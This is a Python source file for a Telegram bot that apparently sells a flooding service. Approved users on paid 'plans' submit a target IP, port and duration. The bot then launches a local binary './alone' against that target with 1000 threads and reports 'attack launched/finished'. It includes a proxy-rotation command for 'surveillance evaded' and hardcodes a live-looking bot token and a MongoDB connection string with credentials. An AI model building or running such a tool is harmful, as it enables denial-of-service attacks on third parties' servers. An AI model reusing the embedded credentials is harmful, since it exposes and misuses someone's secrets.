import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from threading import Thread
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.get_event_loop()

# Bot Configuration: Set with Authority
TOKEN = '7819992909:AAHn51FAfPId42gmKUT5wPmCoyC4_g9OeN0'
ADMIN_USER_ID = 1662672529
MONGO_URI = 'mongodb+srv://sharp:sharp@sharpx.x82gx.mongodb.net/?retryWrites=true&w=majority&appName=SharpX'
USERNAME = "@GODxAloneBOY"  # Immutable username for maximum security

# Attack Status Variable to Control Single Execution
attack_in_progress = False

# Logging for Precision Monitoring
logging.basicConfig(format='%(asctime)s - ⚔️ %(message)s', level=logging.INFO)

# MongoDB Connection - Operative Data Storage
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['soul']
users_collection = db.users

# Bot Initialization
bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Asyncio Loop for Operations
async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

# Proxy Update Command with Dark Authority
def update_proxy():
    proxy_list = []  # Define proxies here
    proxy = random.choice(proxy_list) if proxy_list else None
    if proxy:
        telebot.apihelper.proxy = {'https': proxy}
        logging.info("🕴️ Proxy shift complete. Surveillance evaded.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, f"🔄 Proxy locked in. We’re untouchable. Bot by {USERNAME}")
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ Proxy config failed: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

# Attack Initiation - Operative Status Checks and Intensity
async def run_attack_command_async(target_ip, target_port, duration):
    global attack_in_progress
    attack_in_progress = True  # Set the flag to indicate an attack is in progress

    process = await asyncio.create_subprocess_shell(f"./alone {target_ip} {target_port} {duration} 1000")
    await process.communicate()

    attack_in_progress = False  # Reset the flag after the attack is complete
    notify_attack_finished(target_ip, target_port, duration)

# Final Attack Message Upon Completion
def notify_attack_finished(target_ip, target_port, duration):
    bot.send_message(
        ADMIN_USER_ID,
        f" *🇦 🇹 🇹 🇦 🇨 🇰   🇫 🇮 🇳 🇮 🇸 🇭 🇪 🇩  * \n\n"
        f" * ༒︎༒︎༒︎༒︎༒︎༒︎༒︎༒︎༒︎༒︎༒︎༒︎༒︎༒︎༒︎*\n\n"
        f" *🆃︎🅰︎🆁︎🅶︎🅴︎🆃︎:* `{target_ip}`\n"
        f" *🅿︎🅾︎🆁︎🆃︎:* `{target_port}`\n"
        f" *🅳︎🆄︎🆁︎🅰︎🆃︎🅾︎🅸︎🅽︎:* `{duration} seconds`\n\n"
        f" *𝙨𝙚𝙣𝙙 𝙛𝙚𝙚𝙙𝙛𝙖𝙘𝙠 𝙩𝙤 𝙤𝙬𝙣𝙣𝙚𝙧 {USERNAME}*",
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split()

    if user_id != ADMIN_USER_ID:
        bot.send_message(chat_id, f"❌ *𝙖𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙 . 𝙤𝙣𝙡𝙮 {USERNAME} 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙.*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, f"📝 *Format: /approve <user_id> <plan> <days> or /disapprove <user_id>. Reserved by {USERNAME}*", parse_mode='Markdown')
        return

    action, target_user_id = cmd_parts[0], int(cmd_parts[1])
    plan, days = (int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0), (int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0)

    if action == '/approve':
        limit_reached = (plan == 1 and users_collection.count_documents({"plan": 1}) >= 99) or \
                        (plan == 2 and users_collection.count_documents({"plan": 2}) >= 499)
        if limit_reached:
            bot.send_message(chat_id, f"⚠️ *Plan limit reached. Access denied. Controlled by {USERNAME}*", parse_mode='Markdown')
            return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} granted access – Plan {plan} for {days} days. Approved by {USERNAME}*"
    else:
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} removed. Clearance by {USERNAME}*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    global attack_in_progress
    chat_id = message.chat.id

    # Check if an attack is already in progress
    if attack_in_progress:
        bot.send_message(chat_id, f"⚠️ *𝙬𝙖𝙞𝙩 𝙖𝙣𝙤𝙩𝙝𝙚𝙧 𝙖𝙩𝙩𝙖𝙘𝙠 𝙞𝙨 𝙖𝙡𝙧𝙚𝙙𝙮 𝙧𝙪𝙣𝙣𝙞𝙣𝙜, {USERNAME}.*", parse_mode='Markdown')
        return

    user_id = message.from_user.id

    try:
        # Check user access
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, f"🚫 Unauthorized. Access limited to {USERNAME}.")
            return

        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, f"🟠 Plan 🧡 is full. Reach out to {USERNAME} for upgrades.")
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, f"💥 Instant++ Plan at capacity. Contact {USERNAME}.")
            return

        bot.send_message(chat_id, f"𝙜𝙞𝙫𝙚 𝙢𝙚 ☠︎︎ 𝙞𝙥, 𝙥𝙤𝙧𝙩, 𝙙𝙪𝙧𝙖𝙩𝙤𝙞𝙣 (𝙨𝙚𝙘𝙤𝙣𝙙𝙨). {USERNAME}")
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Attack command error: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, f"⚠️ *𝙚𝙧𝙧𝙤𝙧: 𝙪𝙨𝙚 <𝙞𝙥> <𝙥𝙤𝙧𝙩> <𝙙𝙪𝙧𝙖𝙩𝙤𝙞𝙣>. 𝙤𝙬𝙣𝙣𝙚𝙧 {USERNAME}*", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"🚫 *Port {target_port} restricted. Select a different entry point. Governed by {USERNAME}*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(
            message.chat.id,
            f" *🇦 🇹 🇹 🇦 🇨 🇰   🇱 🇦 🇺 🇳 🇨 🇭 🇪 🇩 * 💀\n\n"
            f" *༒︎༒︎༒︎༒︎༒︎༒︎༒︎༒︎༒︎༒︎༒︎༒︎༒︎༒︎༒︎* \n\n"
            f" *🆃︎🅰︎🆁︎🅶︎🅴︎🆃︎ :* `{target_ip}`\n"
            f" *🅿︎🅾︎🆁︎🆃︎ :* `{target_port}`\n"
            f" *🅳︎🆄︎🆁︎🅰︎🆃︎🅾︎🅸︎🅽︎:* `{duration} seconds`\n\n"
            f" 𝙨𝙚𝙣𝙙 𝙢𝙚 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠  * {USERNAME}* ⚡",
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Error in process_attack_command: {e}")

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Unique, Intense Menu Options
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    options = [
        "🇸 🇹 🇦 🇷 🇹 ", 
        "🇵 🇱 🇦 🇳 ", 
        "🇸 🇺 🇵 🇵 🇴 🇷 🇹 ", 
        "🇴 🇼 🇳 🇳 🇪 🇷 "
    ]
    buttons = [KeyboardButton(option) for option in options]
    markup.add(*buttons)

    bot.send_message(
        message.chat.id,
        f" *🇼 🇪 🇱 🇨 🇴 🇲 🇪  🇹 🇴  🇬 🇴 🇩X 🇨 🇭 🇪 🇦 🇹 🇸 .*  𝙤𝙬𝙣𝙣𝙚𝙧 {USERNAME}",
        reply_markup=markup,
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "🅢︎🅣︎🅐︎🅡︎🅣︎🅔︎🅓︎":
        bot.reply_to(message, f"*𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙧𝙚𝙘𝙞𝙫𝙚𝙙. 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜. 𝙙𝙤𝙣𝙚, {USERNAME}*", parse_mode='Markdown')
        attack_command(message)
    elif message.text == "🅟︎🅛︎🅐︎🅝︎":
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data:
            username = message.from_user.username
            plan, valid_until = user_data.get('plan', 'N/A'), user_data.get('valid_until', 'N/A')
            response = (f"*🆄︎🆂︎🅴︎🆁︎ 🅸︎🅳︎: {username}\n"
                        f"🅿︎🅻︎🅰︎🅽︎: {plan}\n"
                        f"🅰︎🆄︎🆃︎🅷︎🅾︎🆁︎🅸︎🆉︎🅴︎🅳︎: {valid_until}\n"
                        f"🆃︎🅸︎🅼︎🅴︎: {datetime.now().isoformat()}. 𝙫𝙚𝙧𝙞𝙛𝙮 𝙗𝙮 {USERNAME}*")
        else:
            response = f"*𝙥𝙧𝙤𝙛𝙞𝙡𝙚 𝙪𝙣𝙠𝙣𝙤𝙬𝙣. 𝙘𝙤𝙣𝙩𝙖𝙘𝙠 {USERNAME} 𝙛𝙤𝙧 𝙖𝙤𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙.*"
        bot.reply_to(message, response, parse_mode='Markdown')
    elif message.text == "🅢︎🅤︎🅟︎🅟︎🅞︎🅡︎🅣︎":
        bot.reply_to(message, f"*𝙝𝙤𝙬 𝙩𝙤 𝙪𝙨𝙚 /help 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 𝙤𝙬𝙣𝙣𝙚𝙧 {USERNAME} .*", parse_mode='Markdown')
    elif message.text == "🅞︎🅦︎🅝︎🅝︎🅔︎🅡︎":
        bot.reply_to(message, f"*𝙗𝙤𝙩 𝙤𝙬𝙣𝙣𝙚𝙧: {USERNAME}*", parse_mode='Markdown')
    else:
        bot.reply_to(message, f"❌*𝙘𝙤𝙣𝙩𝙖𝙘𝙠 𝙩𝙤 𝙤𝙬𝙣𝙣𝙚𝙧 {USERNAME}*", parse_mode='Markdown')

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("𝙗𝙤𝙩 𝙨𝙩𝙖𝙧𝙩𝙚𝙙  𝙛𝙤𝙧 𝙗𝙜𝙢𝙞 𝙠𝙞 𝙘𝙝𝙪𝙙𝙖𝙮𝙞.")

    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Polling error: {e}")
